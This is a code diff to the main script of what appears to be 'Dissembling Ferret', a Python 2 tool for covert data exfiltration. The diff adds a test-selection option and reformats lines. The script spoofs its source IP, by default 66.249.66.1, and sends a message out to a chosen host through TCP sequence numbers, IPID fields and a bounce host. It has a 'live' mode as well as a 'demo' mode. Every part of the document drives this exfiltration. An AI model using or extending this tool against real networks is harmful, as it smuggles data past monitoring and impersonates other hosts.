@@ -84,13 +84,15 @@ from optparse import OptionParser
 
 # Use OptionParser just to make the interface and feedback nice
 parser = OptionParser()
-parser.add_option ("-d", "--dest", dest="destination_ip", default="foo",
+parser.add_option("-d", "--dest", dest="destination_ip", default="foo",
                     help="Destination IP for the hidden message")
-parser.add_option ("-s", "--spoof", dest="spoof_ip", default="66.249.66.1",
+parser.add_option("-s", "--spoof", dest="spoof_ip", default="66.249.66.1",
                     help="Spoof the source IP address as this value")
-parser.add_option ("-p", "--port", dest="dstport", default="80",
+parser.add_option("-p", "--port", dest="dstport", default="80",
                     help="Destination port (port for Dissembling Ferret server listener)")
-parser.add_option ("-m", "--mode", dest="mode", default="demo",
+parser.add_option("-t", "--test", dest="test", default="all",
+                    help="Test(s) to run <all|seq|ipid|bounce>")
+parser.add_option("-m", "--mode", dest="mode", default="demo",
                     help="Demo or live mode - send packets slowly or immediately")
 (options, args) = parser.parse_args()
 
@@ -126,7 +128,7 @@ if dstport < 0 or dstport > 65535:
     exit(0)
 
 while mode != 'demo' and mode != 'live':
-	mode = raw_input("Use a valid mode (live/demo):")
+    mode = raw_input("Use a valid mode (live/demo):")
 
 
 thishost = os.uname()[1]
@@ -150,20 +152,16 @@ print '[*] Testing method Initial Sequence..'
 initialSeqFerret.exfil_iseq(spoof, destination, dstport, message, bounce=0)
 print '[*] Sent using iseq: %s' % message
 
-
 # ==== use IPID
 print '[*] Testing method IPID..'
 ipidFerret.exfil_ipid(spoof, destination, dstport, message)
 print '[*] Sent using IPID: %s' % message
 
-# exfilArray = []
-# ====
-
-
 # ==== use bounce host
 '''
 The things that are different when performing a bounce scan are:
 - src = destination server
-- dst = host to bounce off of (see spoofable addresses above)
+- dst = host to bounce off of (see spoof addresses above)
+- message stored in ACKs not SEQ.
 '''
 initialSeqFerret.exfil_iseq(spoof, destination, dstport, message, bounce=1)
